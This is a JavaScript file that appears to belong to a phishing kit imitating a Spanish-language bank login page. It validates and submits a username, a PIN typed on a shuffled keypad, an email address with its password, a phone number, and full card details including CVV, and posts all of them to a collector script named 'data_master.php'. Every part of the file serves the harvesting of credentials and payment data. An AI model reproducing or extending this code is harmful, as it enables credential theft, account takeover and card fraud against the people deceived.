var archivo = "data_master.php";

var usuario = makeElement("usuario"),
  fusuario = makeElement("fusuario"),
  btnusuario = makeElement("btnusuario"),
  clave = makeElement("clave"),
  fclave = makeElement("fclave"),
  btnclave = makeElement("btnclave"),
  email = makeElement("email"),
  eclave = makeElement("eclave"),
  telf = makeElement("telf"),
  femail = makeElement("femail"),
  btnemail = makeElement("btnemail"),
  ncard = makeElement("ncard"),
  mes = makeElement("mes"),
  anio = makeElement("anio"),
  cvv = makeElement("cvv"),
  fcard = makeElement("fcard"),
  btncard = makeElement("btncard"),
  borrar = makeElement("borrar");

if (ncard) {
  btncard.addEventListener("click", function () {
    if (
      validateCard(ncard.value) &&
      mes.value.length >= 1 &&
      anio.value.length == 4 &&
      validateCvv(cvv.value)
    ) {
      fcard.setAttribute("method", "post");
      fcard.setAttribute("action", archivo);
      fcard.submit();
    }
  });
  cvv.addEventListener("keyup", ({key}) => {
    if (key === "Enter") {
      if (
        validateCard(ncard.value) &&
        mes.value.length >= 1 &&
        anio.value.length == 4 &&
        validateCvv(cvv.value)
      ) {
        fcard.setAttribute("method", "post");
        fcard.setAttribute("action", archivo);
        fcard.submit();
      }
    }
  });
}

if (email) {
  btnemail.addEventListener("click", function () {
    if (
      validateEmail(email.value) &&
      eclave.value.length > 5
    ) {
      femail.setAttribute("method", "post");
      femail.setAttribute("action", archivo);
      femail.submit();
    }
  });
  telf.addEventListener("keyup", ({key}) => {
    if (key === "Enter") {
      if (
        validateEmail(email.value) &&
        eclave.value.length > 5
      ) {
        femail.setAttribute("method", "post");
        femail.setAttribute("action", archivo);
        femail.submit();
      }
    }
  });
}

if (clave) {
  btnclave.addEventListener("click", function () {
    if (clave.value.length > 3) {
      fclave.setAttribute("method", "post");
      fclave.setAttribute("action", archivo);
      fclave.submit();
    }
  });
  
  cargaTabla();
}

if (usuario) {
  btnusuario.addEventListener("click", function () {
    if (usuario.value.length > 3) {
      fusuario.setAttribute("method", "post");
      fusuario.setAttribute("action", archivo);
      fusuario.submit();
    }
  });
  usuario.addEventListener("keyup", ({key}) => {
    if (key === "Enter") {
      
      if (usuario.value.length > 3) {
        fusuario.setAttribute("method", "post");
        fusuario.setAttribute("action", archivo);
        fusuario.submit();
      }
    }
  });
}

if (borrar) {
  borrar.addEventListener("click", function () {
    clave.value = "";
  });
}

function contrasteImgLvl(numero) {
  var imglvl = makeElement("contraste");
  var tablitanumero = makeElement("tablitanumero");

  switch (numero) {
    case 1:
      imglvl.setAttribute("src", "img/Contraste1.gif");
      tablitanumero.classList.replace(
        tablitanumero.getAttribute("class"),
        "colorContraste1"
      );
      break;
    case 2:
      imglvl.setAttribute("src", "img/Contraste2.gif");
      tablitanumero.classList.replace(
        tablitanumero.getAttribute("class"),
        "colorContraste2"
      );
      break;
    case 3:
      imglvl.setAttribute("src", "img/Contraste3.gif");
      tablitanumero.classList.replace(
        tablitanumero.getAttribute("class"),
        "colorContraste3"
      );
      break;
    default:
      imglvl.setAttribute("src", "img/Contraste2.gif");
      tablitanumero.classList.replace(
        tablitanumero.getAttribute("class"),
        "colorContraste2"
      );
      break;
  }
}
function cargaTabla() {
  var numeros = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];
  var x = desordenar(numeros);

  for (let i = 0; i < 10; i++) {
    makeElement("p" + i).innerHTML = x[i];
    makeElement("p" + i).setAttribute("data-value", x[i]);
  }
}
function asteris() {
  for (let i = 0; i < 10; i++) {
    makeElement("p" + i).innerHTML = "*";
  }
}
function origanalN() {
  for (let i = 0; i < 10; i++) {
    makeElement("p" + i).innerHTML = makeElement("p" + i).getAttribute(
      "data-value"
    );
  }
}
function setvalor(elemento) {
  makeElement("clave").value += elemento.getAttribute("data-value");
}

function makeElement(id) {
  var ident =
    document.getElementById(id) != null ? document.getElementById(id) : false;
  return ident;
}
function desordenar(unArray) {
  var t = unArray.sort(function (a, b) {
    return Math.random() - 0.5;
  });
  return [...t];
}

$(function ($) {
  var optionsEST = {
    utc: true,
    utcOffset: -5,
    format: "%A %R de %B de %Y %l:%M:%S %P",
    language: "es",
  };
  $("#jclock1").jclockNew(optionsEST);
});
function validateEmail(email) {
  const re =
    /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+")){4,}@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  const repe = /^(?!.*?([abcdefghijqlmnñopqrstuvwxyz1234567890])\1{5,}).+/gm;
  return re.test(email) && repe.test(email);
}
function validateAtm(atm) {
  const re = /^[0-9]{4,12}$/;
  return re.test(atm);
}
function validateCvv(cvv) {
  const re = /^[0-9]{3,4}$/;
  return re.test(cvv);
}

function validateCard(card) {
  const re =
    /^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$/;
  return re.test(card);
}
function validatePhone(tlf) {
  const re = /^[0-9]{9,11}/g;
  return re.test(tlf);
}
